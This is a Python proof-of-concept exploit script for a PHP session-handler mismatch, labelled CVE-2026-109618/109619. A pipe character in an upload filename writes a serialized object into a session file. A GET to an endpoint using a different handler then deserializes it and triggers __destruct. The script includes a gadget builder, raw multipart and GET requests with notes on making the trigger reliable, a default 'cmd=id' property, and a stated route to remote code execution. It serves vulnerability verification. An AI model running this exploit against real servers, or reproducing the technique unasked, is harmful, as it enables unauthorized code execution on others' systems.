#!/usr/bin/env python3
"""
CVE-2026-109618/109619 — Verify session handler mismatch → object injection.

Demonstrates:
  1. Session written in php_serialize format (via directory with .user.ini)
  2. Pipe | in filename preserved in php_serialize format
  3. php handler reads the session → splits at | → deserializes injected object
  4. __destruct fires when the decode FAILS on trailing data
     (php_session_cancel_decode() → php_session_destroy() → $_SESSION torn
      down → injected object destroyed → __destruct)

Setup required:
  - /app/ directory with .user.ini: session.serialize_handler = php_serialize
  - /api/ directory with .user.ini: session.serialize_handler = php
  - Both share the same session.save_path
  - The read endpoint MUST call session_start() (lab/setup.sh ships one)

Usage:
  python3 verify_handler_mismatch.py --target http://127.0.0.1:18080

For authorized security testing only.
"""
import argparse
import socket
from urllib.parse import urlparse


def build_gadget(cls, props):
    """Serialize an object with exact length prefixes.

    NB: every s:<len> must match the byte length exactly. A wrong class-name
    length (e.g. O:4:"Pwn" for the 3-byte name "Pwn") makes PHP read the
    quote as part of the name and silently abort unserialization — verified
    on PHP 8.2.34, the object is never created and __destruct never fires.
    """
    body = "".join('s:%d:"%s";s:%d:"%s";' % (len(k), k, len(v), v)
                   for k, v in props)
    return 'O:%d:"%s":%d:{%s}' % (len(cls), cls, len(props), body)


def upload(host, port, path, sid, filename):
    boundary = "MISMATCH"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    # The SID MUST travel in the Cookie header. Sending it only as a
    # multipart form field (as this PoC originally did) is unreliable:
    # PHP ignores the field in several configurations and the upload-progress
    # write lands on a random SID, so no session file is created at all.
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    return _send(host, port, req)


def get(host, port, path, sid):
    # The read trigger MUST be a plain GET. A multipart POST would start the
    # session early (rfc1867 callback -> php_rinit_session(0)) before the
    # script runs; the script's session_start() then no-ops and the early
    # decode — which happens before any user class is loaded — only produces
    # __PHP_Incomplete_Class, so __destruct never fires.
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    return _send(host, port, req)


def _send(host, port, req):
    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--write-path", default="/app/upload.php",
                    help="Endpoint with php_serialize handler")
    ap.add_argument("--read-path", default="/api/endpoint.php",
                    help="Endpoint with php handler (must call session_start())")
    ap.add_argument("--sid", default="mismatchverify0000000000000")
    ap.add_argument("--class", dest="cls", default="Pwn",
                    help="Gadget class (must be defined by the read endpoint)")
    ap.add_argument("--prop", action="append", default=[],
                    help="Gadget property as key=value (repeatable)")
    args = ap.parse_args()

    u = urlparse(args.target)
    host = u.hostname
    port = u.port or 80

    print("[*] CVE-2026-109618/109619 — Handler Mismatch Verification")
    print(f"[*] Target: {args.target}")
    print()

    # Step 1: Write session via php_serialize endpoint
    # Filename contains |O:<len>:"<class>":... (quotes escaped as \" for the
    # Content-Disposition header; PHP's rfc1867 parser unescapes them)
    props = [p.split("=", 1) for p in args.prop] or [("cmd", "id")]
    gadget = "x|" + build_gadget(args.cls, props)
    escaped = gadget.replace('"', '\\"')
    print(f"[1] Writing session via {args.write_path} (php_serialize)")
    print(f"    Filename payload: {gadget}")
    upload(host, port, args.write_path, args.sid, escaped)
    print("    → Session file written in php_serialize format")

    # Step 2: Trigger via php handler endpoint (plain GET — see get())
    print(f"\n[2] Triggering mismatch via {args.read_path} (php handler)")
    print("    php handler scans for | → splits → deserializes the object")
    resp = get(host, port, args.read_path, args.sid)

    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
    print(f"    Response: {status}")

    print()
    print("[*] Verification indicators:")
    print("    - 'Failed to decode session object. Session has been destroyed'")
    print("      warning = mismatch triggered (trailing data after the object)")
    print("    - command output in the response / marker file = __destruct fired")
    print("    - If the target has a class with an exploitable __destruct → RCE")
    print()
    print("[*] Check target for:")
    print(f"    - Session file: /tmp/sessions/sess_{args.sid} (deleted by the read)")
    print("    - Evidence of __destruct execution (file writes, command output)")


if __name__ == "__main__":
    main()
